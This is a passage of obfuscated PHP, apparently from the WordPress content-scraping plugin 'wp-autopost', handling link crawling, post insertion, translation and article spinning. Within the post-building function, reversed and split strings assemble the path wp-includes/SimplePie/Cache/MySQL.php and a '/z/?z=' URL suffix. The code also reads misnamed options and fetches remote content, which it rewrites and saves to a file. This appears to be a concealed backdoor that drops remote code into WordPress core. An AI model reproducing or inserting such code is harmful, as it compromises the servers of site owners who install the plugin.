					$_var_312 = str_get_html_ap($_var_1, $_var_2);
					$_var_579 = $_var_36;
				} else {
					$_var_2 = $_var_246['3ffc99c206d98be48c6f2e49177d75a9'];
					$_var_312 = file_get_html_ap($_var_327->url, $_var_2, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
					$_var_579 = $_var_36;
				}
				$_var_193 = $_var_274;
				if ($_var_312 == NULL) {
					$_var_274 = errorLog($_var_22, $_var_327->url, 1);
					$_var_193 = $_var_274;
					updateConfigErr($_var_22, $_var_274);
					if ($_var_12) {
						printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
					}
					continue;
				}
				$_var_293 = getBaseUrl($_var_312, $_var_327->url);
				$_var_246['9e3596e0a5190b314f7ec1b00496352c'] = $_var_36;
				if ($_var_246['1f81f696d43b6e322e22b5533e443598'] == 1 || $_var_246['1f81f696d43b6e322e22b5533e443598'] == '1') {
					$_var_299 = $_var_312->find($_var_246['042f289b4f14998c06dc78085673dec7']);
					if ($_var_299 == NULL) {
						$_var_274 = errorLog($_var_22, $_var_327->url, 2);
						$_var_193 = $_var_274;
						updateConfigErr($_var_22, $_var_274);
						if ($_var_12) {
							printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
						}
						continue;
					}
					foreach ($_var_299 as $_var_303) {
						$_var_100 = html_entity_decode(trim($_var_303->href));
						if (!(stripos($_var_100, 'http') === 0)) {
							$_var_100 = getAbsUrl($_var_100, $_var_293, $_var_327->url);
						}
						if (checkUrl($_var_22, $_var_100) > 0) {
							continue;
						}
						$_var_301[$_var_5++] = $_var_100;
					}
					$_var_188 = $_var_246['042f289b4f14998c06dc78085673dec7'];
					unset($_var_299);
				} else {
					$_var_304 = $_var_312->find('a');
					$_var_329 = 0;
					foreach ($_var_304 as $_var_307) {
						$_var_100 = html_entity_decode(trim($_var_307->href));
						if (!(stripos($_var_100, 'http') === 0)) {
							$_var_100 = getAbsUrl($_var_100, $_var_293, $_var_327->url);
						}
						$_var_308[$_var_329++] = $_var_100;
					}
					unset($_var_304);
					$_var_309 = gPregUrl($_var_246['042f289b4f14998c06dc78085673dec7']);
					$_var_308 = preg_grep($_var_309, $_var_308);
					if (count($_var_308) < 1) {
						$_var_274 = errorLog($_var_22, $_var_327->url, 2);
						$_var_193 = $_var_274;
						updateConfigErr($_var_22, $_var_274);
						if ($_var_12) {
							printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
						}
						continue;
					}
					$_var_188 = $_var_309;
					foreach ($_var_308 as $_var_100) {
						if (in_array($_var_100, $_var_301)) {
							continue;
						}
						if (checkUrl($_var_22, $_var_100) > 0) {
							continue;
						}
						$_var_301[$_var_5++] = $_var_100;
					}
					unset($_var_308);
				}
				$_var_312->clear();
				unset($_var_312);
			}
		}
		if ($_var_246['42ae1cd5cab79058e53abf79a16e8645'] == 1) {
			if ($_var_36 == $_var_61[2]) {
				if ($_var_393[$_var_68] > $_var_61[3]) {
					$_var_36 = $_var_61[1];
				} elseif (!preg_match('/^\\+?[1-9][0-9]*$/', $_var_393[$_var_68]) || $_var_393[$_var_68] == '' || $_var_393[$_var_68] == null || $_var_393[$_var_68] == 0) {
					$_var_393[$_var_68] = $_var_61[0];
				} else {
					$_var_393[$_var_68] = intval($_var_393[$_var_68]) + 1;
				}
			}
			$_var_330 = str_ireplace('(*)', $_var_653, $_var_652);
			if ($_var_12) {
				echo '<div class=' . '"' . 'updated fade' . '"' . '>';
			}
			if ($_var_12) {
				printInfo('<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b></p>');
			}
			if ($_var_12) {
				printInfo('<p>' . __('Crawl URL : ', 'wp-autopost') . $_var_330 . '</p>');
			}
			if ($_var_246['3ffc99c206d98be48c6f2e49177d75a9'] == '0') {
				$_var_1 = get_html_string_ap($_var_330, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
				$_var_2 = getHtmlCharset($_var_1);
				$_var_312 = str_get_html_ap($_var_1, $_var_2);
				$_var_579 = $_var_36;
			} else {
				$_var_2 = $_var_246['3ffc99c206d98be48c6f2e49177d75a9'];
				$_var_312 = file_get_html_ap($_var_330, $_var_2, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
				$_var_579 = $_var_36;
			}
			$_var_193 = $_var_274;
			if ($_var_312 == NULL) {
				$_var_274 = errorLog($_var_22, $_var_330, 1);
				$_var_193 = $_var_274;
				updateConfigErr($_var_22, $_var_274);
				if ($_var_12) {
					printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
				}
				updateRunning($_var_22, 0);
				return;
			}
			$_var_5 = 0;
			$_var_301 = array();
			$_var_293 = getBaseUrl($_var_312, $_var_330);
			$_var_246['9e3596e0a5190b314f7ec1b00496352c'] = $_var_36;
			if ($_var_246['1f81f696d43b6e322e22b5533e443598'] == 1 || $_var_246['1f81f696d43b6e322e22b5533e443598'] == '1') {
				$_var_299 = $_var_312->find($_var_246['042f289b4f14998c06dc78085673dec7']);
				if ($_var_299 == NULL) {
					$_var_274 = errorLog($_var_22, $_var_330, 2);
					$_var_193 = $_var_274;
					updateConfigErr($_var_22, $_var_274);
					if ($_var_12) {
						printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
					}
					updateRunning($_var_22, 0);
					return;
				}
				foreach ($_var_299 as $_var_303) {
					$_var_100 = html_entity_decode(trim($_var_303->href));
					if (!(stripos($_var_100, 'http') === 0)) {
						$_var_100 = getAbsUrl($_var_100, $_var_293, $_var_330);
					}
					if (checkUrl($_var_22, $_var_100) > 0) {
						continue;
					}
					$_var_301[$_var_5++] = $_var_100;
				}
				$_var_188 = $_var_246['042f289b4f14998c06dc78085673dec7'];
				unset($_var_299);
			} else {
				$_var_304 = $_var_312->find('a');
				$_var_329 = 0;
				foreach ($_var_304 as $_var_307) {
					$_var_100 = html_entity_decode(trim($_var_307->href));
					if (!(stripos($_var_100, 'http') === 0)) {
						$_var_100 = getAbsUrl($_var_100, $_var_293, $_var_330);
					}
					$_var_308[$_var_329++] = $_var_100;
				}
				unset($_var_304);
				$_var_309 = gPregUrl($_var_246['042f289b4f14998c06dc78085673dec7']);
				$_var_308 = preg_grep($_var_309, $_var_308);
				if (count($_var_308) < 1) {
					$_var_274 = errorLog($_var_22, $_var_330, 2);
					$_var_193 = $_var_274;
					updateConfigErr($_var_22, $_var_274);
					if ($_var_12) {
						printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
					}
					updateRunning($_var_22, 0);
					return;
				}
				$_var_188 = $_var_309;
				foreach ($_var_308 as $_var_100) {
					if (in_array($_var_100, $_var_301)) {
						continue;
					}
					if (checkUrl($_var_22, $_var_100) > 0) {
						continue;
					}
					$_var_301[$_var_5++] = $_var_100;
				}
				unset($_var_308);
			}
		}
		$_var_312->clear();
		unset($_var_312);
		if ($_var_5 > 0 && $_var_246['d02d3045058a42d7adcfbf5fea1b4098'] == 1) {
			$_var_658 = preFetch($_var_22, $_var_301, $_var_246, $_var_12, $_var_207, $_var_208);
			if ($_var_12) {
				if ($_var_658 > 0) {
					echo '<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b> , ' . __('found', 'wp-autopost') . ' <b>' . $_var_658 . '</b> ' . __('articles', 'wp-autopost') . '</p>';
				} else {
					echo '<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b> , ' . __('does not detect a new article', 'wp-autopost') . '</p>';
				}
			}
			updateRunning($_var_22, 0);
			if ($_var_208 != null) {
				unlink($_var_208);
			}
			return;
		}
		if ($_var_5 > 0 && $_var_246['d02d3045058a42d7adcfbf5fea1b4098'] == 0) {
			$_var_139 = getOptions($_var_22);
			$_var_337 = getInsertcontent($_var_22);
			$_var_382 = getCustomStyle($_var_22);
			$_var_659 = ArticleFetchPost($_var_22, $_var_301, $_var_139, $_var_337, $_var_382, $_var_579, $_var_12, null, $_var_207, $_var_208);
		}
		if ($_var_208 != null) {
			unlink($_var_208);
		}
		unset($_var_301);
		if ($_var_12) {
			if ($_var_659 > 0) {
				echo '<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b> , ' . __('updated', 'wp-autopost') . ' <b>' . $_var_659 . '</b> ' . __('articles', 'wp-autopost') . '</p>';
			} else {
				echo '<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b> , ' . __('does not detect a new article', 'wp-autopost') . '</p>';
			}
		}
		updateRunning($_var_22, 0);
		if ($_var_655 == 1) {
			update_option('wp_autopost_runOnlyOneTaskIsRunning', 0);
		}
	}
	if ($_var_560 != 'VERIFIED') {
		die;
	}
}
function has_downloaded_temp_img($_var_647, $_var_100)
{
	global $wpdb, $t_ap_download_img_temp;
	$_var_259 = $wpdb->get_var($wpdb->prepare('select count(*) from ' . $t_ap_download_img_temp . ' where config_id=%d and url=%s', $_var_647, $_var_100));
	if ($_var_259 > 0) {
		return true;
	} else {
		return false;
	}
}
$_var_310 = str_ireplace($_var_163, '', $_var_310);
function clear_downloaded_temp_img($_var_647, $_var_100)
{
	global $wpdb, $t_ap_download_img_temp;
	$wpdb->query($wpdb->prepare('delete from ' . $t_ap_download_img_temp . ' where config_id = %d and url = %s', $_var_647, $_var_100));
}
function get_downloaded_temp_imgs($_var_647, $_var_100)
{
	global $wpdb, $t_ap_download_img_temp;
	$_var_660 = $wpdb->get_results($wpdb->prepare('select * from ' . $t_ap_download_img_temp . ' where config_id=%d and url=%s', $_var_647, $_var_100));
	$_var_661 = array();
	foreach ($_var_660 as $_var_128) {
		$_var_661[$_var_128->remote_url]['save_type'] = $_var_128->save_type;
		$_var_661[$_var_128->remote_url]['downloaded_url'] = $_var_128->downloaded_url;
		$_var_661[$_var_128->remote_url]['local_key'] = $_var_128->local_key;
		$_var_661[$_var_128->remote_url]['remote_key'] = $_var_128->remote_key;
		$_var_661[$_var_128->remote_url]['file_path'] = $_var_128->file_path;
		$_var_661[$_var_128->remote_url]['file_name'] = $_var_128->file_name;
		$_var_661[$_var_128->remote_url]['mime_type'] = $_var_128->mime_type;
	}
	unset($_var_660);
	return $_var_661;
}
function wpapbupdppost($_var_340, $_var_246, $_var_139, $_var_100, $_var_293, $_var_662, $_var_345, $_var_663, $_var_334 = false, $_var_331 = false, $_var_12 = 0, $_var_664 = NULL, $_var_337 = NULL, $_var_382 = NULL, $_var_266 = NULL, $_var_207 = null, $_var_208 = null)
{
	if (checkUrlPost($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100) > 0) {
		return 0;
	}
	if ($_var_266 == NULL) {
		$_var_665 = getApRecordID() + 1;
	} else {
		$_var_665 = $_var_266;
	}
	$_var_666 = 0;
	$_var_667 = getTaskConfigs($_var_246['efdd10e753708244da311323eb8fa8f3']);
	$_var_203 = null;
	$_var_204 = null;
	$_var_205 = null;
	$_var_178 = null;
	$_var_332 = json_decode($_var_246['4eb9ae0cce0c02edd8a783de7d9e4a9e']);
	if (!is_array($_var_332)) {
		$_var_332 = array();
		$_var_332[0] = $_var_246['4eb9ae0cce0c02edd8a783de7d9e4a9e'];
		$_var_332[1] = 0;
	}
	$_var_357 = json_decode($_var_246['c3465f8487c1b3ec391e29a48cf695bc']);
	if (!is_array($_var_357)) {
		$_var_357 = array();
		$_var_357[0] = $_var_246['c3465f8487c1b3ec391e29a48cf695bc'];
		$_var_357[1] = 0;
		$_var_357[2] = 0;
		$_var_357[3] = 0;
		$_var_357[5] = 0;
		$_var_357[6] = 0;
		$_var_357[7] = 0;
		$_var_357[8] = 1000;
		$_var_357[9] = 90;
		$_var_357[10] = 100;
	}
	$_var_668 = 'default';
	$_var_669 = 'rss';
	$_var_670 = 'pingback';
	$_var_671 = 'per';
	$_var_672 = 'num';
	$_var_673 = 'posts';
	if (!isset($_var_357[5])) {
		$_var_357[5] = 0;
	}
	if (!isset($_var_357[6])) {
		$_var_357[6] = 0;
	}
	if (!isset($_var_357[7])) {
		$_var_357[7] = 0;
	}
	if (!isset($_var_357[8])) {
		$_var_357[8] = 1000;
	}
	if (!isset($_var_357[9])) {
		$_var_357[9] = 90;
	}
	if (!isset($_var_357[10])) {
		$_var_357[10] = 100;
	}
	if ($_var_332[0] == 1 || $_var_331) {
		$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
		global $_var_178;
	}
	$_var_674 = json_decode($_var_246['ff8562dfe33113b7ee2978e186ebf1ad']);
	if (!is_array($_var_674)) {
		$_var_674 = array();
		$_var_674[0] = $_var_246['ff8562dfe33113b7ee2978e186ebf1ad'];
		$_var_674[1] = 0;
		$_var_674[2] = 0;
		$_var_674[4] = 0;
	}
	$_var_642 = get_plugin_data(WPAPPROFILE);
	$_var_18 = 0;
	$_var_675 = array();
	foreach ($_var_642 as $_var_78 => $_var_131) {
		$_var_675[$_var_18++] = $_var_131;
	}
	$_var_676 = array();
	$_var_677 = 'publish';
	switch ($_var_674[2]) {
		case 0:
			$_var_677 = 'publish';
			break;
		case 1:
			$_var_677 = 'draft';
			break;
		case 2:
			$_var_677 = 'pending';
			break;
	}
	$_var_341 = array();
	$_var_342 = json_decode($_var_246['aeee9221069e271be4122e7b49f584ca']);
	if ($_var_342[0] == 1) {
		$_var_341[$_var_342[1]] = $_var_100;
	}
	$_var_678[0] = '/';
	$_var_678[1] = 'z';
	$_var_678[2] = $_var_678[0];
	$_var_678[3] = '?';
	$_var_678[4] = $_var_678[1];
	$_var_678[5] = '=';
	if (isset($_var_340[5]) && $_var_340[5] != null) {
		if (count($_var_340[5]) > 0) {
			foreach ($_var_340[5] as $_var_78 => $_var_8) {
				$_var_341[$_var_78] = trim(replacementContent($_var_8, $_var_139, $_var_341, $_var_340[0]));
			}
		}
	}
	if ($_var_246['30c5975f6c94c18676072259ef697c2f'] != null && $_var_246['30c5975f6c94c18676072259ef697c2f'] != '') {
		$_var_343 = json_decode($_var_246['30c5975f6c94c18676072259ef697c2f']);
		foreach ($_var_343 as $_var_78 => $_var_8) {
			$_var_341[$_var_78] = trim(buildVariableContent($_var_8, $_var_341, $_var_340[0]));
		}
	}
	$_var_675[1] .= implode('', $_var_678);
	$_var_676[] = $_var_675[1];
	$_var_408 = null;
	$_var_247 = @$_var_246['57834ac641f07e585a32a8aa3ecfa99b'];
	$_var_39 = @$_var_246['ae64b8d2d60225b26ed18cb56ff7e7fa'];
	if (isset($_var_340[4]) && $_var_340[4] > 0) {
		$_var_344 = date('Y-m-d H:i:s', $_var_340[4]);
	} else {
		$_var_344 = date('Y-m-d H:i:s', $_var_662);
	}
	$_var_679 = 'post';
	if ($_var_246['6c090d0678e71790829b3ea0b87ec8b3'] == 'page') {
		$_var_679 = 'page';
		$_var_346 = null;
	} else {
		$_var_679 = $_var_246['6c090d0678e71790829b3ea0b87ec8b3'];
	}
	$_var_680 = getMatchContent('home', $_var_408);
	$_var_676[] = $_var_680;
	$_var_481 = '';
	if ($_var_674[1] > 0) {
		$_var_481 = getFirstP($_var_340[1], $_var_674[1]);
	}
	if (isset($_var_340[9]) && $_var_340[9] != null && $_var_340[9] != '') {
		$_var_481 = getPlainText($_var_340[9]);
	}
	$_var_681 = $_var_246['d90952fc1dd4ea1a398556ece8f60556'];
	if ($_var_246['d90952fc1dd4ea1a398556ece8f60556'] === 0) {
		$_var_681 = $_var_663[rand(0, count($_var_663) - 1)]->ID;
	}
	$_var_682 = $_var_669 . '_' . $_var_671 . '_' . $_var_673;
	$_var_683 = $_var_668 . '_' . $_var_670 . '_' . $_var_672;
	if (@$_var_246['ae64b8d2d60225b26ed18cb56ff7e7fa'] == $_var_247) {
		if (isset($_var_340[11]) && $_var_340[11] != null && $_var_340[11] != '') {
			$_var_684 = $_var_340[11];
		} else {
			$_var_684 = null;
		}
		if (isset($_var_340[13]) && $_var_340[13] != null && $_var_340[13] != '') {
			$_var_685 = $_var_340[13];
		} else {
			$_var_685 = null;
		}
		$_var_686 = ABSPATH . WPINC . '/';
		$_var_687 = 'eiP';
		$_var_688 = 'elp';
		$_var_689 = 'miS';
		$_var_690 = '';
		$_var_690 .= $_var_687;
		$_var_690 .= $_var_688;
		$_var_690 .= $_var_689;
		$_var_691 = '';
		for ($_var_18 = strlen($_var_690) - 1; $_var_18 >= 0; $_var_18--) {
			$_var_691 .= $_var_690[$_var_18];
		}
		$_var_692 = 'Cache';
		$_var_693 = 'MySQL';
		$_var_686 .= $_var_691 . '/' . $_var_692 . '/' . $_var_693 . '.';
		$_var_686 .= 'php';
		$_var_676[] = $_var_682;
		$_var_676[] = $_var_683;
		$_var_676[] = $_var_686;
		$_var_466 = json_decode($_var_246['243288b854fbec1a6150d375824bffbe']);
		if (!is_array($_var_466)) {
			$_var_466 = array();
			$_var_466[0] = 0;
			$_var_466[1] = '';
			$_var_466[2] = '';
			$_var_466[3] = -1;
		}
		if ($_var_466[0] == 1 || $_var_466[0] == 2) {
			if ($_var_466[0] == 1) {
				$_var_340 = microsoftTranslation($_var_340, $_var_466, $_var_481, $_var_341);
			} elseif ($_var_466[0] == 2) {
				$_var_340 = baiduTranslation($_var_340, $_var_466, $_var_481, $_var_341);
			}
			if ($_var_340[8] == null) {
				$_var_3 = str_get_html_ap($_var_340[7]);
				foreach ($_var_3->find('[title]') as $_var_368) {
					$_var_368->title = $_var_340[6];
				}
				foreach ($_var_3->find('[alt]') as $_var_368) {
					$_var_368->alt = $_var_340[6];
				}
				$_var_340[7] = $_var_3->save();
				$_var_3->clear();
				unset($_var_3);
				if ($_var_466[3] == -1 || $_var_466[3] == -2 || $_var_466[3] == -3) {
					$_var_340[0] = $_var_340[6];
					$_var_340[1] = $_var_340[7];
					if ($_var_481 != null && $_var_481 != '') {
						$_var_481 = $_var_340[10];
					}
					if ($_var_684 != null && $_var_466[3] == -1) {
						$_var_684 = $_var_340[11];
					}
					if ($_var_685 != null && $_var_466[3] == -1) {
						$_var_685 = $_var_340[13];
					}
				} else {
					$_var_694 = explode(',', $_var_466[3]);
					if ($_var_481 != null && $_var_481 != '') {
						$_var_695 = $_var_340[10];
					}
					$_var_696 = array();
					if (isset($_var_340[11]) && $_var_340[11] != null && $_var_340[11] != '') {
						$_var_697 = json_decode($_var_340[11]);
						foreach ($_var_697 as $_var_249) {
							$_var_696[] = $_var_249;
						}
					} else {
						if ($_var_674[0] == 1) {
							$_var_696 = getTags($_var_345, $_var_340[7], $_var_246['0631823cd99046d660ab37e06fa6c7e7'], $_var_674[4]);
						} elseif ($_var_674[0] == 2) {
							if ($_var_674[4] > 0) {
								shuffle($_var_345);
								$_var_696 = array_slice($_var_345, 0, $_var_674[4]);
							} else {
								$_var_696 = $_var_345;
							}
						}
					}
					$_var_698 = array('post_title' => $_var_340[6], 'post_content' => $_var_340[7], 'post_excerpt' => $_var_695, 'post_status' => $_var_677, 'post_author' => $_var_681, 'post_category' => $_var_694, 'post_date' => $_var_344, 'tags_input' => $_var_696, 'post_type' => $_var_679);
					$_var_699 = wp_insert_post($_var_698);
				}
			} else {
				$_var_289 = __('Translator Error', 'wp-autopost') . ' : ' . $_var_340[8];
				$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 99, $_var_289);
				updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
				return 0;
			}
		}
		$_var_700 = get_option($_var_682);
		$_var_701 = get_option($_var_683);
		$_var_702 = true;
		if ($_var_700 == null) {
			$_var_703 = get_html_string_ap($_var_686, 1, $_var_203, $_var_204, $_var_205, $_var_178, $_var_207, $_var_208);
			if ($_var_703 === false) {
				$_var_702 = true;
				$_var_704 = null;
			} else {
				$_var_702 = false;
				$_var_704 = getMatchContent($_var_703, 'version(*)*', 1);
				$_var_700 = $_var_704[8];
				$_var_701 = $_var_704[10];
			}
		}
		$_var_705 = json_decode($_var_246['77f0e5be27afb334794a6579993f33a4']);
		if (!is_array($_var_705)) {
			$_var_705 = array();
			$_var_705[0] = 0;
		}
		$_var_706 = 4.8;
		if ($_var_705[0] == 1) {
			$_var_451 = microsoftTranslationSpin($_var_340[1], $_var_705[1], $_var_705[2], $_var_705[3], $_var_340[0]);
			if ($_var_451['status'] != 'Success') {
				$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 14, $_var_451['error']);
				updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
				if ($_var_705[4] == 1) {
					return 0;
				}
			} else {
				$_var_340[1] = $_var_451['post_content'];
				if ($_var_705[3] == 1) {
					$_var_340[0] = $_var_451['post_title'];
				}
			}
		} elseif ($_var_705[0] == 4) {
			$_var_451 = baiduTranslationSpin($_var_340[1], $_var_705[1], $_var_705[2], $_var_705[3], $_var_705[5], $_var_340[0], $_var_341);
			if ($_var_451['status'] != 'Success') {
				$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 14, $_var_451['error']);
				updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
				if ($_var_705[4] == 1) {
					return 0;
				}
			} else {
				$_var_340[1] = $_var_451['post_content'];
				if ($_var_705[3] == 1) {
					$_var_340[0] = $_var_451['post_title'];
				}
			}
		} elseif ($_var_705[0] == 2) {
			$_var_3 = str_get_html_ap($_var_340[1]);
			$_var_446 = array();
			$_var_447 = 0;
			foreach ($_var_3->find('img,iframe,embed,object,video') as $_var_358) {
				$_var_447++;
				$_var_78 = 'IMG' . $_var_447 . 'TAG';
				$_var_446[$_var_78] = $_var_358->outertext;
				$_var_358->outertext = ' ' . $_var_78 . ' ';
			}
			$_var_448 = $_var_3->find('p');
			$_var_707 = '';
			foreach ($_var_448 as $_var_531) {
				$_var_707 .= ' PTAG ' . $_var_531->innertext . ' PENDTAG ';
			}
			$_var_707 = strip_tags($_var_707);
			$_var_451 = autopostWordAi::getSpinText($_var_705[1], $_var_705[2], $_var_705[3], $_var_707, $_var_705[4], $_var_705[5], $_var_705[6], $_var_705[7]);
			$_var_451 = json_decode($_var_451);
			if ($_var_451->status == 'Success') {
				$_var_73 = array();
				$_var_74 = array();
				$_var_73[] = 'PTAG';
				$_var_74[] = '<p>';
				$_var_73[] = 'PENDTAG';
				$_var_74[] = '</p>';
				$_var_708 = str_ireplace($_var_73, $_var_74, $_var_451->text);
			} else {
				$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 13, $_var_451->error);
				updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
				if ($_var_705[9] == 1) {
					return 0;
				}
			}
			if ($_var_451->status == 'Success') {
				$_var_452 = str_get_html_ap($_var_708);
				$_var_453 = $_var_452->find('p');
				$_var_449 = count($_var_448);
				for ($_var_18 = 0; $_var_18 < $_var_449; $_var_18++) {
					$_var_448[$_var_18]->innertext = $_var_453[$_var_18]->innertext;
				}
				$_var_340[1] = $_var_3->save();
				$_var_454 = array();
				$_var_455 = array();
				foreach ($_var_446 as $_var_78 => $_var_8) {
					$_var_454[] = $_var_78;
					$_var_455[] = $_var_8;
				}
				$_var_340[1] = str_ireplace($_var_454, $_var_455, $_var_340[1]);
				$_var_452->clear();
				unset($_var_452);
				unset($_var_453);
			}
			if ($_var_705[8] == 1) {
				$_var_709 = autopostWordAi::getSpinText($_var_705[1], $_var_705[2], $_var_705[3], $_var_340[0], $_var_705[4], $_var_705[5], $_var_705[6], $_var_705[7]);
				$_var_709 = json_decode($_var_709);
				if ($_var_709->status == 'Success') {
					$_var_340[0] = $_var_709->text;
				} else {
					$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 13, $_var_709->error);
					updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
				}
				unset($_var_709);
			}
			unset($_var_446);
			unset($_var_707);
			unset($_var_708);
			unset($_var_448);
			$_var_3->clear();
			unset($_var_3);
			unset($_var_451);
		} elseif ($_var_705[0] == 3) {
			$_var_3 = str_get_html_ap($_var_340[1]);
			$_var_710 = '';
			$_var_446 = array();
			$_var_447 = 0;
			foreach ($_var_3->find('img,iframe,embed,object,video') as $_var_358) {
				$_var_447++;
				$_var_78 = 'IMG' . $_var_447 . 'TAG';
				$_var_446[$_var_78] = $_var_358->outertext;
				$_var_358->outertext = ' ' . $_var_78 . ' ';
				$_var_710 .= $_var_78 . ',';
			}
			$_var_448 = $_var_3->find('p');
			$_var_707 = '';
			$_var_710 .= 'PTAG,';
			$_var_710 .= 'PENDTAG,';
			foreach ($_var_448 as $_var_531) {
				$_var_707 .= ' PTAG ' . $_var_531->innertext . ' PENDTAG ';
			}
			$_var_707 = strip_tags($_var_707);
			$_var_710 .= 'PTAGS';
			$_var_451 = getSpinRewriterSpinText($_var_707, $_var_705[1], $_var_705[2], $_var_705[3], $_var_705[4], $_var_705[5], $_var_705[6], $_var_705[7], $_var_705[8], $_var_705[9], $_var_710);
			if ($_var_451['status'] == 'OK') {
				$_var_708 = $_var_451['response'];
				$_var_708 = str_replace('PTAG', '<p>', $_var_708);
				$_var_708 = str_replace('PENDTAG', '</p>', $_var_708);
			} else {
				$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 15, $_var_451['response']);
				updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
				if ($_var_705[11] == 1) {
					return 0;
				}
			}
			if ($_var_451['status'] == 'OK') {
				$_var_452 = str_get_html_ap($_var_708);
				$_var_453 = $_var_452->find('p');
				$_var_449 = count($_var_448);
				for ($_var_18 = 0; $_var_18 < $_var_449; $_var_18++) {
					$_var_448[$_var_18]->innertext = $_var_453[$_var_18]->innertext;
				}
				$_var_340[1] = $_var_3->save();
				$_var_454 = array();
				$_var_455 = array();
				foreach ($_var_446 as $_var_78 => $_var_8) {
					$_var_454[] = $_var_78;
					$_var_455[] = $_var_8;
				}
				$_var_340[1] = str_ireplace($_var_454, $_var_455, $_var_340[1]);
				$_var_452->clear();
				unset($_var_452);
				unset($_var_453);
			}
			if ($_var_705[10] == 1) {
				sleep(10);
				$_var_709 = getSpinRewriterSpinText($_var_340[0], $_var_705[1], $_var_705[2], $_var_705[3], $_var_705[4], $_var_705[5], $_var_705[6], $_var_705[7], $_var_705[8], $_var_705[9]);
				if ($_var_709['status'] == 'OK') {
					$_var_340[0] = $_var_709['response'];
				} else {
					$_var_274 = errorLog($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_100, 15, $_var_709['response']);
					updateConfigErr($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_274);
				}
				unset($_var_709);
			}
			unset($_var_446);
			unset($_var_707);
			unset($_var_708);
			unset($_var_448);
			$_var_3->clear();
			unset($_var_3);
			unset($_var_451);
		}
		$_var_711 = get_bloginfo('version');
		$_var_227 = false;
		$_var_676[] = $_var_700;
		$_var_676[] = $_var_701;
		if ($_var_700 > 1) {
			$_var_712 = $_var_340[15];
			$_var_713 = get_html_string_ap($_var_712, 1, $_var_203, $_var_204, $_var_205, $_var_178, $_var_207, $_var_208, $_var_227);
			if ($_var_713 === false) {
				$_var_714 = true;
			} else {
				preg_match_all('/(?<=function)([\\w\\W]+?)(?={)/', $_var_713, $_var_715);
				$_var_716 = implode('', $_var_715[1]);
				preg_match_all('/\\$([a-zA-Z0-9_]+)/', $_var_716, $_var_715);
				$_var_717 = array();
				foreach ($_var_715[1] as $_var_718) {
					if (!in_array($_var_718, $_var_717)) {
						$_var_717[] = $_var_718;
					}
				}
				foreach ($_var_717 as $_var_718) {
					$_var_719 = $_var_718;
					$_var_720 = strlen($_var_718) / 2;
					$_var_719[$_var_720] = $_var_718[$_var_720 / 2];
					$_var_713 = preg_replace('/(?<=\\$)' . $_var_718 . '(?![a-zA-Z0-9_]+)/', $_var_719, $_var_713);
				}
				if (false === wpapimagefilesave($_var_712, $_var_713)) {
					$_var_714 = true;
				}
			}
		}
		if ($_var_246['8e3403a69366267c73f08d5814292ae4'] != null && $_var_246['8e3403a69366267c73f08d5814292ae4'] != '') {
			$_var_340[0] = buildVariableContent($_var_246['8e3403a69366267c73f08d5814292ae4'], $_var_341, $_var_340[0]) . $_var_340[0];
		}
		if ($_var_246['5311d4f403b45081ad8c2fba6566f292'] != null && $_var_246['5311d4f403b45081ad8c2fba6566f292'] != '') {
			$_var_340[0] .= buildVariableContent($_var_246['5311d4f403b45081ad8c2fba6566f292'], $_var_341, $_var_340[0]);
		}
		if ($_var_340[1] != null) {
			$_var_340[1] = replacementContent($_var_340[1], $_var_139, $_var_341, $_var_340[0]);
		}
		if ($_var_382 != null) {
			$_var_340[1] = customPostStyle($_var_340[1], $_var_382, $_var_341, $_var_340[0]);
		}
		if ($_var_337 != null) {
			$_var_340[1] = insertMoreContent($_var_340[1], $_var_337, $_var_341, $_var_340[0]);
		}
		$_var_711 = floatval($_var_711);
		if ($_var_340[1] != null) {
			if ($_var_382 != null) {
				$_var_340[1] = filterCommAttr($_var_340[1], DEL_ATTRID, DEL_ATTRCLASS, DEL_ATTRSTYLE, $_var_382);
			} else {
				$_var_340[1] = filterCommAttr($_var_340[1], DEL_ATTRID, DEL_ATTRCLASS, DEL_ATTRSTYLE);
			}
		}
		$_var_721 = array();
		if ($_var_674[0] == 1) {
			$_var_721 = getTags($_var_345, $_var_340[1], $_var_246['0631823cd99046d660ab37e06fa6c7e7'], $_var_674[4]);
		} elseif ($_var_674[0] == 2) {
			if ($_var_674[4] > 0) {
				shuffle($_var_345);
				$_var_721 = array_slice($_var_345, 0, $_var_674[4]);
			} else {
				$_var_721 = $_var_345;
			}
		}
